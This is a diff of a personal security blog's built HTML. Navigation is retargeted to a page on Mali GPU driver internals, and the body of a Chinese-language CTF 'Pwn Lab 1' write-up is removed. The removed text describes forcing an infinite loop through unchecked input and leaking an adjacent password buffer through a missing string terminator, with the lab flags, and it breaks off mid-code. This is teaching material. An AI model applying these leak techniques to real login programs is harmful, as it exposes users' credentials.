@@ -12,24 +12,28 @@
         <meta name="author" content="Jabofish">
       
       
-        <link rel="canonical" href="https://jabofish.github.io/blogs/CTF/Pwn/doc/Pwn%20Lab%201/">
+        <link rel="canonical" href="https://jabofish.github.io/blogs/IS/GPU/mali/">
       
       
+        <link rel="prev" href="../../../CTF/CVE/CVE-2022-36449/">
       
       
-      <link rel="icon" href="../../../../assets/images/favicon.png">
+        <link rel="next" href="../../../UE/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.27">
     
     
       
-        <title>Pwn Lab 1 - Jabofish's Blogs</title>
+        <title>mali - Jabofish's Blogs</title>
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6543a935.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6543a935.min.css">
       
         
-        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
       
       
   
@@ -89,7 +93,7 @@
       
     
     
-    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
   
@@ -125,7 +129,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#pwn-lab-1" class="md-skip">
+        <a href="#aarch64-memory-management" class="md-skip">
           Skip to content
         </a>
       
@@ -141,7 +145,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../../.." title="Jabofish&#39;s Blogs" class="md-header__button md-logo" aria-label="Jabofish's Blogs" data-md-component="logo">
+    <a href="../../.." title="Jabofish&#39;s Blogs" class="md-header__button md-logo" aria-label="Jabofish's Blogs" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -161,7 +165,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Pwn Lab 1
+              mali
             
           </span>
         </div>
@@ -279,7 +283,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
     
@@ -304,7 +308,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../overview/" class="md-tabs__link">
+        <a href="../../../CTF/overview/" class="md-tabs__link">
           
   
     
@@ -323,23 +327,29 @@
         
   
   
+    
+  
   
     
     
       
   
   
+    
+  
   
     
     
       
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../../../IS/env/syzkaller/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../env/syzkaller/" class="md-tabs__link">
           
   
     
@@ -371,7 +381,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../UE/" class="md-tabs__link">
+        <a href="../../../UE/" class="md-tabs__link">
           
   
     
@@ -394,7 +404,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../Others/" class="md-tabs__link">
+        <a href="../../../Others/" class="md-tabs__link">
           
   
     
@@ -437,7 +447,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../../.." title="Jabofish&#39;s Blogs" class="md-nav__button md-logo" aria-label="Jabofish's Blogs" data-md-component="logo">
+    <a href="../../.." title="Jabofish&#39;s Blogs" class="md-nav__button md-logo" aria-label="Jabofish's Blogs" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -467,7 +477,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -591,7 +601,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../overview/" class="md-nav__link">
+      <a href="../../../CTF/overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -612,7 +622,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Web/" class="md-nav__link">
+      <a href="../../../CTF/Web/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -633,7 +643,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Misc/" class="md-nav__link">
+      <a href="../../../CTF/Misc/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -654,7 +664,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Reverse/" class="md-nav__link">
+      <a href="../../../CTF/Reverse/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -675,7 +685,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
+      <a href="../../../CTF/Pwn/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -696,7 +706,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Crypto/" class="md-nav__link">
+      <a href="../../../CTF/Crypto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -748,7 +758,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../CS61A/" class="md-nav__link ">
+            <a href="../../../CS61A/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -807,7 +817,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../ADS/" class="md-nav__link ">
+            <a href="../../../ADS/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -937,7 +947,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Database/CMU/Lecture1/" class="md-nav__link">
+      <a href="../../../Database/CMU/Lecture1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -958,7 +968,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Database/CMU/Lecture2/" class="md-nav__link">
+      <a href="../../../Database/CMU/Lecture2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -979,7 +989,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Database/CMU/Lecture3/" class="md-nav__link">
+      <a href="../../../Database/CMU/Lecture3/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1000,7 +1010,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Database/CMU/Lecture4/" class="md-nav__link">
+      <a href="../../../Database/CMU/Lecture4/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1041,8 +1051,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -1051,19 +1063,20 @@
     
     
       
+        
+        
+      
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   <span class="md-ellipsis">
@@ -1074,7 +1087,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             科研
@@ -1085,8 +1098,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -1104,13 +1119,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
         
           
           <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
@@ -1124,7 +1137,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_1">
             <span class="md-nav__icon md-icon"></span>
             IS
@@ -1182,7 +1195,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../IS/env/syzkaller/" class="md-nav__link">
+      <a href="../../env/syzkaller/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1259,7 +1272,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../IS/CS489698/handout-1/" class="md-nav__link">
+      <a href="../../CS489698/handout-1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1280,7 +1293,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../IS/CS489698/handout-2/" class="md-nav__link">
+      <a href="../../CS489698/handout-2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1301,7 +1314,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../IS/CS489698/handout-9/" class="md-nav__link">
+      <a href="../../CS489698/handout-9/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1380,7 +1393,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../CVE/CVE-2022-20186/" class="md-nav__link">
+      <a href="../../../CTF/CVE/CVE-2022-20186/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1401,7 +1414,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../CVE/CVE-2022-38181/" class="md-nav__link">
+      <a href="../../../CTF/CVE/CVE-2022-38181/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1422,7 +1435,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../CVE/CVE-2021-28663/" class="md-nav__link">
+      <a href="../../../CTF/CVE/CVE-2021-28663/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1443,7 +1456,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../CVE/CVE-2022-36449/" class="md-nav__link">
+      <a href="../../../CTF/CVE/CVE-2022-36449/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1469,8 +1482,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -1482,13 +1497,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_4" checked>
         
           
           <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
@@ -1502,7 +1515,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_1_4">
             <span class="md-nav__icon md-icon"></span>
             源码阅读
@@ -1513,10 +1526,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../../../IS/GPU/mali/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    mali
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -1525,6 +1558,113 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#address-spaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      Address Spaces
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mmu" class="md-nav__link">
+    <span class="md-ellipsis">
+      MMU
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MMU">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#main-kbase-ioctls-kbase_ioctl_type-0x80" class="md-nav__link">
+    <span class="md-ellipsis">
+      Main KBASE IOCTLs (KBASE_IOCTL_TYPE 0x80)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-ioctls-kbase_ioctl_test_type-0x81" class="md-nav__link">
+    <span class="md-ellipsis">
+      Test IOCTLs (KBASE_IOCTL_TEST_TYPE 0x81)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#customer-extension-ioctls-kbase_ioctl_extra_type-0x82" class="md-nav__link">
+    <span class="md-ellipsis">
+      Customer Extension IOCTLs (KBASE_IOCTL_EXTRA_TYPE 0x82)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gpu-property-keys-used-with-kbase_ioctl_get_gpuprops" class="md-nav__link">
+    <span class="md-ellipsis">
+      GPU Property Keys (Used with KBASE_IOCTL_GET_GPUPROPS)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kbase_context" class="md-nav__link">
+    <span class="md-ellipsis">
+      kbase_context
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kbase_va_region" class="md-nav__link">
+    <span class="md-ellipsis">
+      kbase_va_region
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kbase_mem_phy_alloc" class="md-nav__link">
+    <span class="md-ellipsis">
+      kbase_mem_phy_alloc
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1647,7 +1787,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../UE/" class="md-nav__link ">
+            <a href="../../../UE/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1680,7 +1820,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week1/" class="md-nav__link">
+      <a href="../../../UE/Week1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1701,7 +1841,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week2/" class="md-nav__link">
+      <a href="../../../UE/Week2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1722,7 +1862,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week3/" class="md-nav__link">
+      <a href="../../../UE/Week3/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1743,7 +1883,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week4/" class="md-nav__link">
+      <a href="../../../UE/Week4/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1764,7 +1904,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week5/" class="md-nav__link">
+      <a href="../../../UE/Week5/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1785,7 +1925,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week6/" class="md-nav__link">
+      <a href="../../../UE/Week6/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1806,7 +1946,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week7/" class="md-nav__link">
+      <a href="../../../UE/Week7/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1827,7 +1967,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week8/" class="md-nav__link">
+      <a href="../../../UE/Week8/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1848,7 +1988,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../UE/Week9/" class="md-nav__link">
+      <a href="../../../UE/Week9/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1923,7 +2063,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../AI/DAinML/Lecture1/" class="md-nav__link">
+      <a href="../../../AI/DAinML/Lecture1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1944,7 +2084,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../AI/DAinML/Lecture2/" class="md-nav__link">
+      <a href="../../../AI/DAinML/Lecture2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2011,7 +2151,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../Others/" class="md-nav__link ">
+            <a href="../../../Others/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2044,7 +2184,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Others/Economics/" class="md-nav__link">
+      <a href="../../../Others/Economics/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2065,7 +2205,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../Others/GameTheory/" class="md-nav__link">
+      <a href="../../../Others/GameTheory/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2101,7 +2241,7 @@
                   
 
   
-    <a href="https://github.com/Jabofish/blogs/edit/main/docs/CTF/Pwn/doc/Pwn Lab 1.md" title="Edit this page" class="md-content__button md-icon">
+    <a href="https://github.com/Jabofish/blogs/edit/main/docs/IS/GPU/mali.md" title="Edit this page" class="md-content__button md-icon">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg>
     </a>
@@ -2110,288 +2250,542 @@
     
       
     
-    <a href="https://github.com/Jabofish/blogs/raw/main/docs/CTF/Pwn/doc/Pwn Lab 1.md" title="View source of this page" class="md-content__button md-icon">
+    <a href="https://github.com/Jabofish/blogs/raw/main/docs/IS/GPU/mali.md" title="View source of this page" class="md-content__button md-icon">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg>
     </a>
   
 
 
-<div><h1 id="pwn-lab-1">Pwn Lab 1<a class="headerlink" href="#pwn-lab-1" title="Permanent link">¶</a></h1>
-<h2 id="1-task-1">1. Task 1<a class="headerlink" href="#1-task-1" title="Permanent link">¶</a></h2>
-<p>观察代码，检索出可能存在漏洞的部分：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-0-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Input your decimal number: "</span><span class="p">);</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3"></a>
-<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"What do you want to turn it into: "</span><span class="p">);</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6"></a>
-<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">pow</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">            </span><span class="k">break</span><span class="p">;</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">    </span><span class="p">}</span>
-</code></pre></div></td></tr></table></div>
-<p>代码没有对输入做判断，所以可以构造特殊的输入让程序陷入死循环。a &lt;= pow(b, i)时跳出，所以只需要让a&gt;pow(b, i)恒成立即可，例如，a取一个大于1的整数，b取0，pow的部分永远是1，这样程序就不会退出，于是有：</p>
-<p><img alt="1720430674452" src="../image/PwnLab1/1720430674452.png"></p>
-<p>得到flag：AAA{pr0GraM_C4n_ea5ilY_crAsH}</p>
-<p>本题可以纯交互完成，所以没有附上代码。</p>
-<p><img alt="1720430900575" src="../image/PwnLab1/1720430900575.png"></p>
-<h2 id="2-task-2">2. Task 2<a class="headerlink" href="#2-task-2" title="Permanent link">¶</a></h2>
-<p>检查代码，这是一个登录程序，有两个用户，分别为"user"和"admin"，因此需要想办法找到密码，检查密码输入的逻辑，发现代码使用了 <code>read(STDIN_FILENO,buf,BUFFER_SIZE);</code>而最后输出的时候有 <code>printf("you input password as %s (len %d)\n",password,strlen(password));</code>，使用了strlen函数，而这个函数默认以第一个遇到的'/0'为结尾，如果没有遇到则会一直输出，直到遇到'/0'。而代码中变量定义是挨在一起的：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span>
-<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
-<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kt">char</span><span class="w"> </span><span class="n">password_verify</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
-</code></pre></div></td></tr></table></div>
-<p>说明在内存中输入的密码和真正的密码是存在相邻的位置的，通过构造无结尾的字符就能使程序输出真正的密码：</p>
-<p><img alt="1720432627684" src="../image/PwnLab1/1720432627684.png"></p>
-<p>然后再输入真正的密码登入，拿到第一部分的flag：AAA{Oh_D1rTy_sta</p>
-<p><img alt="1720432818807" src="../image/PwnLab1/1720432818807.png"></p>
-<p>如法炮制拿到admin的密码,然后重新登录，用cat拿到第二部分的flag：CK_Ne3d_C1a4n}</p>
-<p><img alt="1720440583893" src="../image/PwnLab1/1720440583893.png"></p>
-<p>完整的flag为：AAA{Oh_D1rTy_staCK_Ne3d_C1a4n}</p>
-<p><img alt="1720440652565" src="../image/PwnLab1/1720440652565.png"></p>
-<h2 id="3-task-3">3. Task 3<a class="headerlink" href="#3-task-3" title="Permanent link">¶</a></h2>
-<p>对文件进行反汇编，可以看出：这个代码要求我们在实现一些计算功能的代码后，以汇编的形式传入，程序会用我们提供的函数进行计算只有全部通过了才能拿到flag1：</p>
-<p><img alt="1720441173263" src="../image/PwnLab1/1720441173263.png"></p>
-<p>因此，我们需要先得到这些运算的汇编代码，我们将所有功能写进一个c文件中：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-2-10">10</a></span>
-<span class="normal"><a href="#__codelineno-2-11">11</a></span>
-<span class="normal"><a href="#__codelineno-2-12">12</a></span>
-<span class="normal"><a href="#__codelineno-2-13">13</a></span>
-<span class="normal"><a href="#__codelineno-2-14">14</a></span>
-<span class="normal"><a href="#__codelineno-2-15">15</a></span>
-<span class="normal"><a href="#__codelineno-2-16">16</a></span>
-<span class="normal"><a href="#__codelineno-2-17">17</a></span>
-<span class="normal"><a href="#__codelineno-2-18">18</a></span>
-<span class="normal"><a href="#__codelineno-2-19">19</a></span>
-<span class="normal"><a href="#__codelineno-2-20">20</a></span>
-<span class="normal"><a href="#__codelineno-2-21">21</a></span>
-<span class="normal"><a href="#__codelineno-2-22">22</a></span>
-<span class="normal"><a href="#__codelineno-2-23">23</a></span>
-<span class="normal"><a href="#__codelineno-2-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">)</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="p">{</span>
-<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
-<a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="p">}</span>
-<a id="__codelineno-2-5" name="__codelineno-2-5"></a>
-<a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="kt">int</span><span class="w"> </span><span class="nf">sub</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="p">)</span>
